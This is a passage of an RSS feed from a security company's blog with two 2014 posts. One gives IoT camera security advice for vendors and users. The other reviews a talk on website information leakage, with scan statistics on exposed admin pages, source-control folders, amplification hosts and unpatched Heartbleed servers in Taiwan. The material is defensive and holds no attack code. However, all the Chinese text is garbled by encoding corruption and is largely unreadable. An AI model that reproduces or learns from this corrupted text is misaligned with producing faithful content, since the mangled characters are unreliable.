  &lt;li&gt;ÊîπÂñÑË≥áÂÆâÂïèÈ°åÊõ¥Êñ∞ÊµÅÁ®ãÔºöÂ∞áÁî¢ÂìÅÁöÑË≥áÂÆâÊõ¥Êñ∞ÊîπËÆäÊàê‰∏ªÂãïÈÄöÁü•‰ΩøÁî®ËÄÖÔºåËÄåÈùûÈúÄË¶Å‰ΩøÁî®ËÄÖ‰∏ªÂãïÂà∞ÂÆòÁ∂≤ÁúãÊâçÁü•ÈÅìÊõ¥Êñ∞Ôºå‰ª•Á∏ÆÁü≠‰ΩøÁî®ËÄÖÊõ¥Êñ∞ÁöÑÂπ≥ÂùáÈÄ±ÊúüÔºåÁ¢∫‰øù‰ΩøÁî®ËÄÖÁöÑËªüÈ´îÊòØÊúÄÊñ∞ÁÑ°È¢®Èö™ÁâàÊú¨„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊàêÁ´ãÂ∞àÈñÄË≥áÂÆâÂ∞èÁµÑÔºöË´ãÂ∞à‰∫∫Ë≤†Ë≤¨Ê™¢È©óÁî¢ÂìÅÁöÑË≥áÂÆâÂìÅË≥™Ëàá‰øÆÊ≠£Ë≥áÂÆâÂº±ÈªûÔºå‰ª•‰æøÂõ†ÊáâËá®ÊôÇÁàÜÁôºÁöÑÈáçÂ§ßÂº±ÈªûÔºåÁ∂≠ÊåÅÁî¢ÂìÅÁöÑË≥áÂÆâÂìÅË≥™„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÈªëÁÆ±Êª≤ÈÄèÊ∏¨Ë©¶ÔºöÊñºÁî¢ÂìÅÂá∫Âª†ÂâçÂü∑Ë°åÈªëÁÆ±Êª≤ÈÄèÊ∏¨Ë©¶ÔºåËÆìÊª≤ÈÄèÊ∏¨Ë©¶Â∞àÂÆ∂ÂæûÈªëÂ∏ΩÈß≠ÂÆ¢ÁöÑËßíÂ∫¶‰æÜÊ™¢Êü•Áî¢ÂìÅÊúâÁÑ°ÊºèÊ¥û„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁôΩÁÆ±ÂéüÂßãÁ¢ºÊ™¢Ê∏¨ÔºöÂÆöÊúüÂü∑Ë°åÂéüÂßãÁ¢ºÊ™¢Ê∏¨ÔºåÂæûÁî¢ÂìÅÁöÑÊ†πÊú¨ËôïËëóÊâãÊîπÂñÑÔºåÈôç‰ΩéÁî¢ÂìÅ‰∏äÂ∏ÇÂæåÊâçË¢´ÁôºÁèæÂº±ÈªûÁöÑÊ©üÁéá„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ë≥áÂÆâÊïôËÇ≤Ë®ìÁ∑¥ÔºöË´ãÊúâÂØ¶ÈöõÊîªÈò≤Á∂ìÈ©óÁöÑË≥áÂÆâÂ∞àÂÆ∂Áµ¶‰∫àÈñãÁôº‰∫∫Âì°Ê≠£Á¢∫ÁöÑË≥áÂÆâËßÄÂøµÔºå‰∫ÜËß£ÊúÄÊñ∞ÁöÑÊîªÊìäÊâãÊ≥ïËàáÊúâÊïàÈò≤Á¶¶‰πãÈÅì„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÆöÊúüÊ™¢Èñ±Áî¢ÂìÅÊâÄ‰ΩøÁî®ÁöÑÁ¨¨‰∏âÊñπËªüÈ´îÂ•ó‰ª∂ÊòØÂê¶ÊúâÂº±ÈªûÔºå‰æãÂ¶Ç OpenSSLÔºå‰ª•ÈÅøÂÖçÊääÊúâÂïèÈ°åÁöÑÁâàÊú¨Á¥çÂÖ•Áî¢ÂìÅÔºåÈÄ†ÊàêÁî¢ÂìÅÈñìÊé•Áî¢ÁîüÂº±ÈªûÔºåÂõ†ËÄåÈÅ≠Âà∞ÂÖ•‰æµ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÆöÊôÇÊñºÁ∂≤Ë∑Ø‰∏äÊî∂ÈõÜÁî¢ÂìÅÁöÑÁõ∏ÈóúÂº±ÈªûË≥áÊñôÔºå‰æãÂ¶Ç &lt;a href=&quot;http://secunia.com/&quot;&gt;Secunia&lt;/a&gt;„ÄÅ&lt;a href=&quot;http://www.securityfocus.com/&quot;&gt;SecurityFocus&lt;/a&gt;„ÄÅ&lt;a href=&quot;http://packetstormsecurity.com/&quot;&gt;Packet Storm&lt;/a&gt; Á≠âÁ∂≤Á´ôÈÉΩÊòØÂæàÂ•ΩÁöÑË≥áË®ä‰æÜÊ∫ê„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ºÅÊ•≠Ë©≤Â¶Ç‰Ωï‰∫°ÁæäË£úÁâ¢&quot;&gt;‰∏ÄËà¨‰ΩøÁî®ËÄÖ„ÄÅ‰ºÅÊ•≠Ë©≤Â¶Ç‰Ωï‰∫°ÁæäË£úÁâ¢Ôºü&lt;/h3&gt;

&lt;p&gt;ÁõÆÂâçÁöÑÁ∂≤Ë∑ØÂÆâÊéßÁ≥ªÁµ±‰ΩøÁî®ËÄÖ‰ªçÊú™ÊúâË∂≥Â§†ÁöÑË≥áÂÆâÊÑèË≠òÔºå‰∏ªË¶ÅÁèæË±°Êúâ‰ª•‰∏ãÂπæÈªûÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‰ΩøÁî®Âº±ÂØÜÁ¢º&lt;/li&gt;
  &lt;li&gt;Êú™ÈÄ≤Ë°åÈÅ©Áï∂ÁöÑÊ¨äÈôêÂäÉÂàÜËàáÁÆ°ÁêÜ&lt;/li&gt;
  &lt;li&gt;ÂÆπÊòìÈñãÂïìÊîªÊìäËÄÖÂØÑÈÄÅÁöÑÊÉ°ÊÑèÈÄ£ÁµêÔºåÂ∞éËá¥Ë¢´ XSS„ÄÅCSRF Á≠âÊâãÊ≥ïÊîªÊìä&lt;/li&gt;
  &lt;li&gt;Êú™ÈôêÂà∂ÈÄ£ÂÖ• IP ‰ΩçÂùÄÔºåÂ∞éËá¥ÂÆâÊéßÁ≥ªÁµ±ÂèØÂæûÂ§ñÁ∂≤‰ªªÊÑèÂ≠òÂèñ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÁÑ∂ËÄåÔºåÁÑ°Ë´ñÊòØÂÆâÊéßÁ≥ªÁµ±ÊàñÂÖ∂‰ªñ‰ªª‰ΩïÈÄ£Á∂≤Ë®≠ÂÇôÔºåÊú™‰æÜÈÉΩÊúâÂèØËÉΩÊàêÁÇ∫ÊΩõÂú®ÁöÑÊîªÊìäÁõÆÊ®ôÔºåËÄå‰∏îÂú®Âª†ÂïÜÊèê‰æõÊõ¥Êñ∞Ê™î‰πãÂâçÂÖ∂ÂØ¶‰πüÂæàÈõ£Á¢∫ÂØ¶Âú∞Ëá™‰øùÔºåÂõ†Ê≠§‰∫ÜËß£Ë≥áÂÆâÁü•Ë≠òËàáÂ∏∏Ë¶ãÁöÑÊîªÊìäÊâãÊ≥ïÊòØÊúâÂÖ∂ÂøÖË¶ÅÁöÑ„ÄÇÂü∫Êú¨ÁöÑÈò≤ÁØÑ‰πãÈÅìÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‰ΩøÁî®Âº∑ÂØÜÁ¢ºÔºåÂåÖÂê´Â§ßÂ∞èÂØ´Ëã±Êñá„ÄÅÊï∏Â≠ó„ÄÅÁâπÊÆäÁ¨¶ËôüÔºå‰∏¶‰∏îÂÆöÊúüÊõ¥ÊèõÂØÜÁ¢º&lt;/li&gt;
  &lt;li&gt;ÂãøÂú®Á≥ªÁµ±Âª∫Á´ãÂ§™Â§ö‰∏çÂøÖË¶ÅÁöÑ‰ΩøÁî®ËÄÖÂ∏≥Ëôü„ÄÅÂ∞áÂ§öÈ§òÁöÑÂ∏≥ËôüÁßªÈô§Ôºå‰ª•Èôç‰ΩéÂ∏≥ËôüË¢´ÁõúÁöÑÊ©üÁéá„ÄÇËã•ÈúÄË¶ÅÂª∫Á´ãÂ§öÁµÑÂ∏≥ËôüÔºåË´ã‰ªîÁ¥∞Áµ¶‰∫àÈÅ©Áï∂ÁöÑÊ¨äÈôê&lt;/li&gt;
  &lt;li&gt;ÂãøÈö®ÊÑèÈñãÂïüÂèØÁñë‰ø°‰ª∂ÈôÑÂ∏∂ÁöÑÈÄ£ÁµêÊàñÊ™îÊ°àÔºå‰ª•ÈÅøÂÖçË¢´ÊîªÊìäËÄÖ‰ª• XSS„ÄÅCSRF Á≠âÊâãÊ≥ïÊîªÊìä&lt;/li&gt;
  &lt;li&gt;ÈôêÂà∂ÂèØÂ≠òÂèñË≥áË®äÁ≥ªÁµ±ÁöÑ IP ‰ΩçÂùÄÔºåÈÅøÂÖçË≥áË®äÁ≥ªÁµ±ÊàêÁÇ∫ÂÖ¨ÈñãÁöÑÊîªÊìäÁõÆÊ®ô&lt;/li&gt;
  &lt;li&gt;ÂÆöÊúüÊ™¢Êü• logÔºåÁ¢∫Ë™çÊúâÁÑ°Áï∞Â∏∏ÁôªÂÖ•„ÄÅÁï∞Â∏∏Êìç‰ΩúÁîöËá≥ÊòØÁï∞Â∏∏Â∏≥ËôüÁ≠âË≥áË®ä&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;Âú®Áâ©ÈÄ£Á∂≤ÁöÑÊôÇ‰ª£‰∏≠ÔºåÂêÑÁ®ÆÂèØÈÄ≤Ë°åÁÑ°Á∑öÈÄöË®äÁöÑË®≠ÂÇôË¢´ÊîªÊìäÁöÑ‰∫ã‰ª∂Â±¢Ë¶ã‰∏çÈÆÆÔºå‰æãÂ¶Ç 2011 Âπ¥Áü•ÂêçÈß≠ÂÆ¢ Jay Radcliffe Âú® Black Hat Â±ïÁ§∫Â¶Ç‰ΩïÊîªÊìäËÉ∞Â≥∂Á¥†Ê≥®Â∞ÑÂô®Ôºå2013 Âπ¥Â∑≤ÊïÖÈß≠ÂÆ¢ Barnaby Jack ÂéüÊú¨Ë¶ÅÂú® Black Hat Â±ïÁ§∫Â¶Ç‰ΩïÂà©Áî®ËóçËäΩÈÄöË®äÊéßÂà∂ÂøÉÂæãË™øÊï¥Âô®ÔºåÁîöËá≥ 2014 Âπ¥Áî´Êé®Âá∫ÁöÑÂèØÈÅ†Á®ãËÆäÊèõÈ°èËâ≤ÁáàÊ≥°‰πüË¢´Êè≠Èú≤ÊúâË≥áÂÆâÂïèÈ°å„ÄÇÂú®‰∏ç‰πÖÁöÑÊú™‰æÜÔºåÈÄô‰∫õË≥áÂÆâÂïèÈ°åÂè™ÊúÉÊõ¥Â§öÔºåË∫´ÁÇ∫Ê∞ëÁúæ„ÄÅ‰ºÅÊ•≠„ÄÅÂª†ÂïÜÁöÑ‰Ω†ÔºåÊ∫ñÂÇôÂ•ΩÈù¢Â∞çËê¨Áâ©ÁöÜÂèØÈß≠ÁöÑÁâ©ÈÄ£Á∂≤ÊôÇ‰ª£‰∫ÜÂóéÔºü&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/</link>
                <guid>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr</guid>
                <pubDate>Wed, 24 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Ë¢´ÈÅ∫ÂøòÁöÑË≥áË®äÊ¥©ÊºèÔºçÈáçÈªûÂõûÈ°ß</title>
                <description>&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

&lt;p&gt;Âú®‰ªäÂπ¥Èß≠ÂÆ¢Âπ¥ÊúÉ‰ºÅÊ•≠Â†¥ÔºåÊàëÂÄëÂàÜ‰∫´‰∫Ü‰∏ÄÂ†¥„ÄéË¢´ÈÅ∫ÂøòÁöÑË≥áË®äÊ¥©Êºè„Äè„ÄÇË≥áË®äÊ¥©ÊºèÊòØÂçÅÂπæÂπ¥ÂâçÂ∞±Ë¢´‰∏ÄÊèêÂÜçÊèêÁöÑË≠∞È°åÔºåÂú®Ë≥áË®äÂÆâÂÖ®È†òÂüü‰∏≠‰πüÊòØÊúÄÊúÄÊúÄÂü∫Êú¨Ë©≤Ê≥®ÊÑèÁöÑ‰∫ãÊÉÖÔºåÁÑ∂ËÄåËá≥‰ªäÂæàÂ§öÁ∂≤Á´ôÈÉΩÈÇÑÊòØÂøΩÁï•ÂÆÉÔºåÁîöËá≥ÈÄ£‰∏Ä‰∫õÁÜ±ÈñÄÁ∂≤Á´ôÈÉΩ‰ªçÊúâË≥áË®äÊ¥©ÊºèÂïèÈ°å„ÄÇË≠∞Á®ã‰∏≠ÊàëÂÄëËàâ‰∫ÜÂ§ßÈáèÁöÑ‰æãÂ≠êË≠âÊòéË≥áË®äÊ¥©ÊºèÂÖ∂ÂØ¶ÂèØ‰ª•ÂæàÂö¥ÈáçÔºåÂ∏åÊúõËÉΩÂπ´Â§ßÂÆ∂Ë§áÁøí‰∏Ä‰∏ãÔºåÂ¶ÇÊûúÁ∂≤Á´ôÊ≤íÊúâÊ≥®ÊÑèÈÄô‰∫õÔºåÊúÉÈÄ†Êàê‰ªÄÈ∫ºÊ®£ÁöÑÂæåÊûú„ÄÇË≠∞Á®ãÊäïÂΩ±ÁâáÂ¶Ç‰∏ãÊâÄÁ§∫ÔºåÂ∞±ËÆìÊàëÂÄë‰æÜÁ∏ΩÁµê‰∏Ä‰∏ãÂêßÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;center&gt;&lt;iframe src=&quot;http://www.slideshare.net/slideshow/embed_code/38312258&quot; width=&quot;560&quot; height=&quot;460&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot;&gt; &lt;/iframe&gt;&lt;/center&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;devcore-Â∏∏Âà©Áî®ÁöÑË≥áË®äÊ¥©Êºè&quot;&gt;DEVCORE Â∏∏Âà©Áî®ÁöÑË≥áË®äÊ¥©Êºè&lt;/h3&gt;

&lt;p&gt;È¶ñÂÖàÊàëÂÄëÂæûÈÅéÂæÄÊª≤ÈÄèÊ∏¨Ë©¶Á∂ìÈ©ó‰∏≠ÊåëÈÅ∏‰∫ÜÂπæÂÄãÂ∏∏Ë¶ãÁöÑË≥áË®äÊ¥©ÊºèÂïèÈ°åÔºåÂàÜÂà•Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÁÆ°ÁêÜ‰ªãÈù¢Ê¥©Êºè (p8-p19)&lt;/li&gt;
  &lt;li&gt;ÁõÆÈåÑ(Index of)Ê¥©Êºè (p20-p28)&lt;/li&gt;
  &lt;li&gt;ÈåØË™§Ë®äÊÅØÊ¥©Êºè (p29-p35)&lt;/li&gt;
  &lt;li&gt;Êö´Â≠ò„ÄÅÊ∏¨Ë©¶Ë≥áË®ä (p36-p46)&lt;/li&gt;
  &lt;li&gt;ÁâàÊú¨ÊéßÁÆ° (p47-p55)&lt;/li&gt;
  &lt;li&gt;DNS Ë≥áË®äÊ¥©Êºè (p56-p63)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰ª•‰∏äÁ®ÆÁ®Æ‰∏çÂêåÊ¥©ÊºèÊñπÂºèÔºåÂèØËÉΩÊúÉÊ¥©ÊºèÂá∫Á≥ªÁµ±Áí∞Â¢ÉË≥áË®ä„ÄÅÁ®ãÂºèÁ¢ºÂÖßÂÆπ„ÄÅÂê´ÊúâÂ∏≥ËôüÂØÜÁ¢ºÁöÑË®≠ÂÆöÊ™îÁ≠â„ÄÇÈÄèÈÅéÈÄô‰∫õË≥áË®äÔºåÈß≠ÂÆ¢Â∞±ËÉΩÁµÑÁπîÂá∫‰∏ÄÂÄãÊúâÊïàÁöÑÊîªÊìäË°åÂãï„ÄÇÊàëÂÄëÁîöËá≥Âú®ÈÅéÂæÄÁöÑÁ∂ìÈ©ó‰∏≠ÔºåÂè™ÈÄèÈÅéÁõÆÊ®ôÁöÑË≥áË®äÊ¥©ÊºèÔºåÂ∞±Áõ¥Êé•ÂèñÂæóË≥áÊñôÂ∫´Êìç‰ΩúÊ¨äÈôê(Ë©≥Ë¶ãÊäïÂΩ±Áâá p65-p71)„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÇ∫‰∫ÜËß£ÁõÆÂâç‰∏Ä‰∫õÁÜ±ÈñÄÁ∂≤Á´ôÊòØÂê¶ÈáçË¶ñÈÄô‰∫õÊúÄÂü∫Êú¨ÁöÑ‰øùË≠∑ÔºåÊàëÂÄëÂØ¶ÈöõÂ∞ç alexa Âè∞ÁÅ£Ââç 525 ÂêçÁöÑÁ∂≤Á´ôÈÄ≤Ë°åË≥áË®äÊ¥©ÊºèÁöÑË™øÊü•„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/phpmyadmin_leak.jpg&quot; alt=&quot;phpmyadmin È†ÅÈù¢Ê¥©ÊºèÁãÄÊ≥Å&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140826/phpinfo_leak.jpg&quot; alt=&quot;phpinfo È†ÅÈù¢Ê¥©ÊºèÁãÄÊ≥Å&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÁÆ°ÁêÜ‰ªãÈù¢ÂíåÊ∏¨Ë©¶È†ÅÈù¢Ê¥©ÊºèÁöÑÈ†ÖÁõÆÔºåÊàëÂÄëÁî®Âæà‰øùÂÆàÁöÑÊñπÂºèÊ∏¨Ë©¶Ê†πÁõÆÈåÑ‰∏ãÊòØÂê¶Â≠òÊúâ phpmyadmin Âíå phpinfo È†ÅÈù¢ÔºåÁµêÊûúÂàÜÂà•Êúâ 7% Âíå 9% ÁöÑÁ∂≤Á´ôÊúâÈÄôÊ®£ÁöÑÂïèÈ°å„ÄÇÈÄôÊ®£ÁöÑÁµêÊûúÈùûÂ∏∏‰ª§‰∫∫Ë®ùÁï∞ÔºåÁï¢Á´üÂèóÊ∏¨Á∂≤Á´ôÈÉΩÊòØÁü•Âêç‰∏îÊúâÊäÄË°ìÂäõÁöÑÁ∂≤Á´ôÔºåËÄå‰∏î‰∏¶ÈùûÊâÄÊúâÁ∂≤Á´ôÈÉΩ‰ΩøÁî® php ÈñãÁôºÔºåÂÜçÂä†‰∏äÊàëÂÄëÂè™ÊòØÊ∏¨Ë©¶È†êË®≠ÁöÑÂëΩÂêçÔºåÂØ¶ÈöõÊ¥©ÊºèÁöÑÊÉÖÊ≥ÅÊúÉÊõ¥Â§öÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/version_control_leak.jpg&quot; alt=&quot;ÁâàÊú¨ÊéßÂà∂Ê¥©ÊºèÁãÄÊ≥Å&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âè¶‰∏ÄÂÄãÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÁâàÊú¨ÊéßÁÆ°Ê¥©ÊºèÂïèÈ°åÔºåÊàëÂÄëÂêåÊ®£‰øùÂÆàÁöÑÂè™ÈáùÂ∞çÁâàÊú¨ÊéßÁÆ°ËªüÈ´î‰∏≠ GIT Âíå SVN ÂÖ©È†ÖÈÄ≤Ë°åË™øÊü•„ÄÇÁµêÊûúÁ´üÁÑ∂Êúâ 10% ÁöÑÁ∂≤Á´ôÊúâÈÄôÊ®£ÁöÑÂïèÈ°å„ÄÇÈÄôÂÄãÁèæË±°ÈùûÂ∏∏Âö¥ÈáçÔºÅÈÄôÂÄãÁèæË±°ÈùûÂ∏∏Âö¥ÈáçÔºÅÈÄôÂÄãÁèæË±°ÈùûÂ∏∏Âö¥ÈáçÔºÅÈÄôÂÄãÊ¥©ÊºèÊúâÊ©üÊúÉËÉΩÈÇÑÂéüÊï¥ÂÄãÊúçÂãôÁöÑÂéüÂßãÁ¢ºÔºåË¢´ÊîªÊìäÊàêÂäüÁöÑÊ©üÁéáÁõ∏Áï∂È´òÔºÅÂè∞ÁÅ£ÁÜ±ÈñÄÁöÑÁ∂≤Á´ôË£°ÔºåÂçÅÂÄãË£°Èù¢Â∞±Êúâ‰∏ÄÂÄãÂ≠òÊúâÈÄôÊ®£ÁöÑÂïèÈ°åÔºåÈùûÂ∏∏Âç±Èö™ÔºåÁÖ©Ë´ãÁúãÂà∞ÈÄôÁØáÊñáÁ´†ÁöÑÊúãÂèãËÉΩÂéªÊ≥®ÊÑèË≤¥ÂÖ¨Âè∏ÁöÑÁ∂≤Á´ôÊòØÂê¶Â≠òÂú®ÈÄôÊ®£ÁöÑÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â§ßÊï∏ÊìöË≥áÊñôËíêÈõÜ&quot;&gt;Â§ßÊï∏ÊìöË≥áÊñôËíêÈõÜ&lt;/h3&gt;

&lt;p&gt;Âú®ÈÄôÂ†¥Ë≠∞Á®ã‰∏≠ÔºåÊàëÂÄëÈÇÑÊèêÂà∞‰∫ÜÂè¶‰∏ÄÂÄãÂ±§Ê¨°ÁöÑË≥áË®äÊ¥©ÊºèË≠∞È°åÔºöÁï∂ÂÖ®‰∏ñÁïå‰∏ªÊ©üÁöÑÊúçÂãôÂèäÁâàÊú¨Ë≥áË®äÂÖ®ÈÉ®ÈÉΩË¢´Êî∂ÈõÜËµ∑‰æÜÔºåÊúÉÁôºÁîü‰ªÄÈ∫ºÊ®£ÁöÑ‰∫ãÊÉÖÔºü&lt;/p&gt;

&lt;p&gt;Èß≠ÂÆ¢ÊìÅÊúâÈÄôÊ®£ÁöÑË≥áÊñôÔºåÂ∞±ËÉΩÂ§†Âú®ÈùûÂ∏∏Áü≠Êö´ÁöÑÊôÇÈñìÂÖßÁØ©ÈÅ∏Âá∫ÊúâÂïèÈ°åÁöÑ‰∏ªÊ©üÔºåÈÄ≤Ë°åÂ§ßÈáèÁöÑÂÖ•‰æµ„ÄÇÊàëÂÄëÂà©Áî®È°û‰ººÁöÑÊäÄË°ìÈáùÂ∞çÂè∞ÁÅ£‰∏ªÊ©üÂø´ÈÄüÁöÑÈÄ≤Ë°åÊéÉÊèèÔºåÂ∞±ÁôºÁèæ‰∫ÜÂè∞ÁÅ£Êúâ 61414 Âè∞‰∏ªÊ©üÂèØ‰ª•Ë¢´Âà©Áî®‰æÜÂÅö DNS Amplification DDoS ÊîªÊìä„ÄÅ1003 Âè∞‰∏ªÊ©üÂèØ‰ª•Ë¢´Âà©Áî®‰æÜÂÅö NTP Amplification DDoS ÊîªÊìä„ÄÇ‰πüÂ∞±ÊòØË™™ÔºåÈß≠ÂÆ¢ÂèØ‰ª•Âú®Áü≠ÊôÇÈñìÂÖßÁµÑÁπî‰∏ÄÊîØÂÖ≠Ëê¨Â§ö‰∫∫ÁöÑÂè∞ÁÅ£Â§ßËªçÔºåÂèØ‰ª•ÈáùÂ∞ç‰ªñÊÉ≥Ë¶ÅÊîªÊìäÁöÑÁõÆÊ®ôÈÄ≤Ë°åÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/heartbleed.jpg&quot; alt=&quot;OpenSSL Heartbleed Â∞öÊú™‰øÆÂæ©ÁöÑÁãÄÊ≥Å&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âà©Áî®Áõ∏ÂêåÁöÑÊäÄË°ìÔºåÊàëÂÄë‰πüÈ†Ü‰æøÊ™¢È©ó‰∫ÜÂâçÈô£Â≠êÈùûÂ∏∏ÁÜ±ÈñÄÁöÑ &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; ÂïèÈ°å„ÄÇOpenSSL Heartbleed Ë¢´Á®±‰πãÁÇ∫„ÄéËøëÂçÅÂπ¥Á∂≤Ë∑ØÊúÄÂö¥ÈáçÁöÑÂÆâÂÖ®ÊºèÊ¥û„ÄèÔºåÂÖ∂Âö¥ÈáçÁ®ãÂ∫¶ÂèØ‰ª•ÊÉ≥Ë¶ãÔºåÁÑ∂ËÄåÊ†πÊìöÊàëÂÄëÁöÑËßÄÂØüÔºåÂè∞ÁÅ£Ëá≥‰ªä‰ªçÊúâ 1480 Âè∞ HTTP ‰º∫ÊúçÂô®Â∞öÊú™‰øÆÂæ©ÔºåËÄåÂè∞ÁÅ£Ââç 525 Â§ßÁÜ±ÈñÄÁ∂≤Á´ô‰∏≠Ôºå‰πüÊúâ 21 ÂÄã(4%)Á∂≤Á´ôÊú™‰øÆÂæ©„ÄÇË∂≥Ë¶ãÂè∞ÁÅ£Á∂≤Á´ôÂ∞çÊñºË≥áÂÆâÁöÑÊÑèË≠ò‰ªçÁÑ∂‰∏çÂ§†„ÄÇ&lt;/p&gt;

&lt;p&gt;Â∞çÊñºÈÄôÊ®£Êµ∑ÈáèÊî∂ÈõÜË≥áÊñôË°çÁîüÁöÑË≥áÂÆâË≠∞È°åÔºåÊàëÂÄëË™çÁÇ∫ÊúÄÂ§ßÁöÑÂèóÂÆ≥ËÄÖÔºåÊòØÁâ©ËÅØÁ∂≤ÁöÑ‰ΩøÁî®ËÄÖÔºÅÂ∞±ÊàëÂÄëÁöÑËßÄÂØüÔºåÁâ©ËÅØÁ∂≤ÁöÑË®≠ÂÇôÈÄöÂ∏∏ÂÆâÂÖ®Èò≤Ë≠∑‰∏ç‰Ω≥ÔºåÂÆπÊòìÈÅ≠ÂèóÂà∞Èß≠ÂÆ¢ÊîªÊìäÔºåÂâçÈô£Â≠ê &lt;a href=&quot;http://www8.hp.com/us/en/hp-news/press-release.html?id=1744676&quot;&gt;HP ‰πüÂá∫‰∫Ü‰∏Ä‰ªΩÂ†±ÂëäÊåáÂá∫&lt;/a&gt;ÔºåÁâ©ËÅØÁ∂≤ÁöÑË®≠ÂÇôÊúâ‰∏ÉÊàêÂ≠òÂú®Âº±ÈªûÔºåËÄå‰∏îÊØèÂè∞Ë®≠ÂÇôÂπ≥ÂùáÊúâ 25 ÂÄãÂº±Èªû„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÁâ©ËÅØÁ∂≤ÁöÑË®≠ÂÇô‰∏çÊòìÊõ¥Êñ∞ÔºåÂ∞ëÊúâ‰∫∫ÊúÉÂÆöÊúüÊõ¥Êñ∞ÔºåÊõ¥Â∞éËá¥Áâ©ËÅØÁ∂≤Ë®≠ÂÇôÂèØ‰ª•Ë¢´Â§ßÁØÑÂúçÁöÑÊîªÊìäÔºåÈÄ≤ËÄåÊª≤ÈÄèÂÆ∂Áî®Á∂≤Ë∑ØÔºåÂç±ÂÆ≥‰ΩøÁî®ËÄÖÂ±ÖÂÆ∂Èö±ÁßÅ„ÄÇÈÄôÊòØÂÄãÊú™‰æÜÈúÄË¶ÅÊåÅÁ∫åÈóúÊ≥®ÁöÑÈáçË¶ÅË≠∞È°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/synolocker.jpg&quot; alt=&quot;‰ªçÊö¥Èú≤Âú® SynoLocker È¢®Èö™ÁãÄÊ≥ÅÁµ±Ë®à&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÔºåÊàëÂÄëÁî®ÊúÄËøë SynoLocker ÁöÑÊ°à‰æãÁÇ∫Â§ßÊï∏ÊìöË≥áÊñôËíêÈõÜ‰ΩúÁµêÔºåSynoLocker ÊòØ‰∏ÄÊ¨æÈáùÂ∞ç Synology ÁöÑÂãíÁ¥¢ËªüÈ´îÔºåÂéªÂπ¥Â∫ï Synology ÂÆòÊñπÂ∑≤Á∂ìÊé®Âá∫Êñ∞Áâà‰øÆÊ≠£ÂïèÈ°åÔºåÊú¨Êúà SynoLocker Êì¥Êï£Ëá≥ÂÖ®‰∏ñÁïåÔºåÊñ∞ËÅû‰∏ÄÂÜçÂº∑Ë™øÈúÄË¶ÅÊõ¥Êñ∞ NASÔºå‰ΩÜÊàëÂÄëÈáùÂ∞çÂè∞ÁÅ£ 1812 Âè∞Â∞çÂ§ñÈñãÊîæÁöÑ Synology NAS ÂÅöÁµ±Ë®àÔºåËá≥‰ªä‰ªçÁôºÁèæÊúâ 64ÔºÖ ÁöÑ‰ΩøÁî®ËÄÖÊ≤íÊúâÊõ¥Êñ∞Ôºå‰πüÂ∞±ÊòØÈÄô‰∫õ NAS ‰ªçÊö¥Èú≤Âú® SynoLocker ÁöÑÈ¢®Èö™‰∏≠„ÄÇÈÄô‰ª∂‰∫ãÊÉÖÂèàÂÜçÊ¨°Ë≠âÊòéÈß≠ÂÆ¢ÊúâËÉΩÂäõÂú®Áü≠ÊôÇÈñìÂà©Áî®Â§ßÊï∏ÊìöË≥áÊñôÊâæÂà∞ÊîªÊìäÁõÆÊ®ôÔºå‰πüÈ†ÜÂ∏∂Ë™™Êòé‰∫ÜÂè∞ÁÅ£Ë≥áÂÆâÊÑèË≠òÊôÆÈÅç‰∏çË∂≥ÁöÑÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

